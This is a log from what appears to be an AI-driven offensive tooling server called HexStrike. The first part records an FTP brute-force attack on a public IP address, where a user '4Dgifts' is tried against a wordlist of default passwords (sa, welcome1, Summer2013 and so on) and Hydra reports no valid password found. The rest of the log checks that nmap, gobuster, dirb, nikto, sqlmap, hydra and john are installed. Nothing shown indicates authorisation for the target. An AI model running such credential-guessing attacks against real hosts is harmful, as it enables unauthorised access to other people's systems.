2025-10-24 01:47:03,819 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:sqlsvr (Incorrect: )
2025-10-24 01:47:07,743 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:sqlaccount (Incorrect: )
2025-10-24 01:47:11,364 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:account (Incorrect: )
2025-10-24 01:47:14,955 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:sasa (Incorrect: )
2025-10-24 01:47:19,007 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:sa (Incorrect: )
2025-10-24 01:47:22,609 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:administator (Incorrect: )
2025-10-24 01:47:26,637 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:pass (Incorrect: )
2025-10-24 01:47:30,533 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:sql (Incorrect: )
2025-10-24 01:47:33,650 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:microsoft (Incorrect: )
2025-10-24 01:47:37,507 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:sqlserver (Incorrect: )
2025-10-24 01:47:40,927 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:sa (Incorrect: )
2025-10-24 01:47:45,239 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:hugs (Incorrect: )
2025-10-24 01:47:49,082 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:sasa (Incorrect: )
2025-10-24 01:47:52,474 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:welcome (Incorrect: )
2025-10-24 01:47:56,613 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:welcome1 (Incorrect: )
2025-10-24 01:47:59,962 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:welcome2 (Incorrect: )
2025-10-24 01:48:03,236 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:march2011 (Incorrect: )
2025-10-24 01:48:06,918 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:sqlpass (Incorrect: )
2025-10-24 01:48:10,136 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:sqlpassword (Incorrect: )
2025-10-24 01:48:14,143 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:guessme (Incorrect: )
2025-10-24 01:48:17,710 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:bird (Incorrect: )
2025-10-24 01:48:21,664 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:P@55w0rd! (Incorrect: )
2025-10-24 01:48:25,792 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:test (Incorrect: )
2025-10-24 01:48:29,260 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:dev (Incorrect: )
2025-10-24 01:48:33,167 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:devdev (Incorrect: )
2025-10-24 01:48:36,994 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:devdevdev (Incorrect: )
2025-10-24 01:48:40,637 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:qa (Incorrect: )
2025-10-24 01:48:44,712 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:god (Incorrect: )
2025-10-24 01:48:48,665 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:admin (Incorrect: )
2025-10-24 01:48:52,187 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:adminadmin (Incorrect: )
2025-10-24 01:48:53,162 - __main__ - INFO - 📤 STDOUT: [STATUS] 103.00 tries/min, 1545 tries in 00:15h, 177130 to do in 28:40h, 4 active
2025-10-24 01:48:55,894 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:admins (Incorrect: )
2025-10-24 01:48:59,890 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:goat (Incorrect: )
2025-10-24 01:49:03,403 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:sysadmin (Incorrect: )
2025-10-24 01:49:07,361 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:water (Incorrect: )
2025-10-24 01:49:11,135 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:dirt (Incorrect: )
2025-10-24 01:49:15,132 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:air (Incorrect: )
2025-10-24 01:49:18,693 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:earth (Incorrect: )
2025-10-24 01:49:21,971 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:company (Incorrect: )
2025-10-24 01:49:26,130 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:company1 (Incorrect: )
2025-10-24 01:49:29,503 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:company123 (Incorrect: )
2025-10-24 01:49:33,337 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:company1! (Incorrect: )
2025-10-24 01:49:37,341 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:company! (Incorrect: )
2025-10-24 01:49:40,225 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:secret (Incorrect: )
2025-10-24 01:49:43,860 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:secret! (Incorrect: )
2025-10-24 01:49:47,409 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:secret123 (Incorrect: )
2025-10-24 01:49:51,349 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:secret1212 (Incorrect: )
2025-10-24 01:49:54,485 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:secret12 (Incorrect: )
2025-10-24 01:49:58,046 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:secret1! (Incorrect: )
2025-10-24 01:50:01,898 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:sqlpass123 (Incorrect: )
2025-10-24 01:50:04,906 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Summer2013 (Incorrect: )
2025-10-24 01:50:08,303 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Summer2012 (Incorrect: )
2025-10-24 01:50:12,149 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Summer2011 (Incorrect: )
2025-10-24 01:50:15,503 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Summer2010 (Incorrect: )
2025-10-24 01:50:18,601 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Summer2009 (Incorrect: )
2025-10-24 01:50:22,475 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Summer2008 (Incorrect: )
2025-10-24 01:50:25,877 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Winter2013 (Incorrect: )
2025-10-24 01:50:42,287 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Winter2012 (Incorrect: )
2025-10-24 01:51:12,292 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Winter2011 (Unable to Connect: )
2025-10-24 01:51:42,297 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Winter2010 (Unable to Connect: )
2025-10-24 01:52:12,300 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Winter2009 (Unable to Connect: )
2025-10-24 01:52:12,304 - __main__ - INFO - 📤 STDOUT: [1m[34m[*][0m 138.197.27.76:21      - Scanned 1 of 1 hosts (100% complete)
2025-10-24 01:52:12,304 - __main__ - INFO - 📤 STDOUT: [1m[34m[*][0m Auxiliary module execution completed
2025-10-24 01:52:12,402 - __main__ - INFO - 📤 STDOUT: [0m
2025-10-24 01:52:36,821 - __main__ - WARNING - 📥 STDERR: [ERROR] all children were disabled due too many connection errors
2025-10-24 01:52:36,822 - __main__ - INFO - 📤 STDOUT: 0 of 1 target completed, 0 valid password found
2025-10-24 01:52:36,823 - __main__ - INFO - 📤 STDOUT: [INFO] Writing restore file because 2 server scans could not be completed
2025-10-24 01:52:36,823 - __main__ - INFO - 📤 STDOUT: Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-24 01:52:36
2025-10-24 01:52:36,822 - __main__ - WARNING - 📥 STDERR: [ERROR] 1 target was disabled because of too many errors
2025-10-24 01:52:36,823 - __main__ - WARNING - 📥 STDERR: [ERROR] 1 targets did not complete
2025-10-24 06:15:11,288 - __main__ - INFO - 🔧 Process pool worker 0 started
2025-10-24 06:15:11,288 - __main__ - INFO - 🔧 Process pool worker 1 started
2025-10-24 06:15:11,289 - __main__ - INFO - 🔧 Process pool worker 2 started
2025-10-24 06:15:11,289 - __main__ - INFO - 🔧 Process pool worker 3 started
2025-10-24 06:15:11,318 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:11,318 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Starting HexStrike AI Tools API Server[0m
2025-10-24 06:15:11,318 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:11,318 - __main__ - INFO - [1m│[0m [38;5;208m🌐 Port:[0m 8888
2025-10-24 06:15:11,318 - __main__ - INFO - [1m│[0m [38;5;208m🔧 Debug Mode:[0m False
2025-10-24 06:15:11,318 - __main__ - INFO - [1m│[0m [38;5;129m💾 Cache Size:[0m 1000 | TTL: 3600s
2025-10-24 06:15:11,318 - __main__ - INFO - [1m│[0m [38;5;240m⏱️  Command Timeout:[0m 300s
2025-10-24 06:15:11,318 - __main__ - INFO - [1m│[0m [38;5;46m✨ Enhanced Visual Engine:[0m Active
2025-10-24 06:15:11,318 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:11,326 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8888
 * Running on http://10.2.0.2:8888
2025-10-24 06:15:11,326 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-10-24 06:15:12,112 - __main__ - INFO - 🔍 Cache MISS for command: which nmap
2025-10-24 06:15:12,112 - __main__ - INFO - 🚀 EXECUTING: which nmap
2025-10-24 06:15:12,113 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,114 - __main__ - INFO - 🆔 PROCESS: PID 2988 started
2025-10-24 06:15:12,114 - __main__ - INFO - 🆔 REGISTERED: Process 2988 - which nmap...
2025-10-24 06:15:12,114 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 2988
2025-10-24 06:15:12,116 - __main__ - INFO - 📤 STDOUT: /usr/bin/nmap
2025-10-24 06:15:12,118 - __main__ - INFO - 🧹 CLEANUP: Process 2988 removed from registry
2025-10-24 06:15:12,118 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,118 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,118 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,118 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,118 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which nmap
2025-10-24 06:15:12,118 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,118 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 14 bytes
2025-10-24 06:15:12,119 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,119 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,119 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,119 - __main__ - INFO - 💾 Cached result for command: which nmap
2025-10-24 06:15:12,119 - __main__ - INFO - 🔍 Cache MISS for command: which gobuster
2025-10-24 06:15:12,119 - __main__ - INFO - 🚀 EXECUTING: which gobuster
2025-10-24 06:15:12,119 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,119 - __main__ - INFO - 🆔 PROCESS: PID 2993 started
2025-10-24 06:15:12,119 - __main__ - INFO - 🆔 REGISTERED: Process 2993 - which gobuster...
2025-10-24 06:15:12,120 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 2993
2025-10-24 06:15:12,122 - __main__ - INFO - 📤 STDOUT: /usr/bin/gobuster
2025-10-24 06:15:12,125 - __main__ - INFO - 🧹 CLEANUP: Process 2993 removed from registry
2025-10-24 06:15:12,125 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,125 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,125 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,125 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,125 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which gobuster
2025-10-24 06:15:12,125 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,125 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 06:15:12,125 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,125 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,125 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,125 - __main__ - INFO - 💾 Cached result for command: which gobuster
2025-10-24 06:15:12,125 - __main__ - INFO - 🔍 Cache MISS for command: which dirb
2025-10-24 06:15:12,125 - __main__ - INFO - 🚀 EXECUTING: which dirb
2025-10-24 06:15:12,125 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,126 - __main__ - INFO - 🆔 PROCESS: PID 2998 started
2025-10-24 06:15:12,126 - __main__ - INFO - 🆔 REGISTERED: Process 2998 - which dirb...
2025-10-24 06:15:12,127 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 2998
2025-10-24 06:15:12,128 - __main__ - INFO - 📤 STDOUT: /usr/bin/dirb
2025-10-24 06:15:12,131 - __main__ - INFO - 🧹 CLEANUP: Process 2998 removed from registry
2025-10-24 06:15:12,131 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,131 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,131 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,132 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,132 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which dirb
2025-10-24 06:15:12,132 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,132 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 14 bytes
2025-10-24 06:15:12,132 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,132 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,132 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,132 - __main__ - INFO - 💾 Cached result for command: which dirb
2025-10-24 06:15:12,132 - __main__ - INFO - 🔍 Cache MISS for command: which nikto
2025-10-24 06:15:12,132 - __main__ - INFO - 🚀 EXECUTING: which nikto
2025-10-24 06:15:12,132 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,132 - __main__ - INFO - 🆔 PROCESS: PID 3003 started
2025-10-24 06:15:12,132 - __main__ - INFO - 🆔 REGISTERED: Process 3003 - which nikto...
2025-10-24 06:15:12,133 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3003
2025-10-24 06:15:12,135 - __main__ - INFO - 📤 STDOUT: /usr/bin/nikto
2025-10-24 06:15:12,136 - __main__ - INFO - 🧹 CLEANUP: Process 3003 removed from registry
2025-10-24 06:15:12,136 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,136 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,136 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,136 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,136 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which nikto
2025-10-24 06:15:12,136 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,136 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 15 bytes
2025-10-24 06:15:12,136 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,136 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,136 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,136 - __main__ - INFO - 💾 Cached result for command: which nikto
2025-10-24 06:15:12,136 - __main__ - INFO - 🔍 Cache MISS for command: which sqlmap
2025-10-24 06:15:12,136 - __main__ - INFO - 🚀 EXECUTING: which sqlmap
2025-10-24 06:15:12,136 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,137 - __main__ - INFO - 🆔 PROCESS: PID 3008 started
2025-10-24 06:15:12,137 - __main__ - INFO - 🆔 REGISTERED: Process 3008 - which sqlmap...
2025-10-24 06:15:12,138 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3008
2025-10-24 06:15:12,140 - __main__ - INFO - 📤 STDOUT: /usr/bin/sqlmap
2025-10-24 06:15:12,141 - __main__ - INFO - 🧹 CLEANUP: Process 3008 removed from registry
2025-10-24 06:15:12,141 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,141 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,141 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,141 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,141 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which sqlmap
2025-10-24 06:15:12,141 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,141 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 06:15:12,141 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,141 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,141 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,141 - __main__ - INFO - 💾 Cached result for command: which sqlmap
2025-10-24 06:15:12,141 - __main__ - INFO - 🔍 Cache MISS for command: which hydra
2025-10-24 06:15:12,141 - __main__ - INFO - 🚀 EXECUTING: which hydra
2025-10-24 06:15:12,141 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,142 - __main__ - INFO - 🆔 PROCESS: PID 3013 started
2025-10-24 06:15:12,142 - __main__ - INFO - 🆔 REGISTERED: Process 3013 - which hydra...
2025-10-24 06:15:12,143 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3013
2025-10-24 06:15:12,144 - __main__ - INFO - 📤 STDOUT: /usr/bin/hydra
2025-10-24 06:15:12,147 - __main__ - INFO - 🧹 CLEANUP: Process 3013 removed from registry
2025-10-24 06:15:12,147 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,147 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,147 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,147 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,147 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which hydra
2025-10-24 06:15:12,147 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,147 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 15 bytes
2025-10-24 06:15:12,147 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,147 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,147 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,147 - __main__ - INFO - 💾 Cached result for command: which hydra
2025-10-24 06:15:12,147 - __main__ - INFO - 🔍 Cache MISS for command: which john
2025-10-24 06:15:12,147 - __main__ - INFO - 🚀 EXECUTING: which john
2025-10-24 06:15:12,147 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,147 - __main__ - INFO - 🆔 PROCESS: PID 3018 started
2025-10-24 06:15:12,147 - __main__ - INFO - 🆔 REGISTERED: Process 3018 - which john...
2025-10-24 06:15:12,148 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3018
2025-10-24 06:15:12,150 - __main__ - INFO - 📤 STDOUT: /usr/sbin/john
2025-10-24 06:15:12,152 - __main__ - INFO - 🧹 CLEANUP: Process 3018 removed from registry
2025-10-24 06:15:12,152 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,152 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,152 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,152 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,152 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which john
2025-10-24 06:15:12,152 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,152 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 15 bytes
2025-10-24 06:15:12,152 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
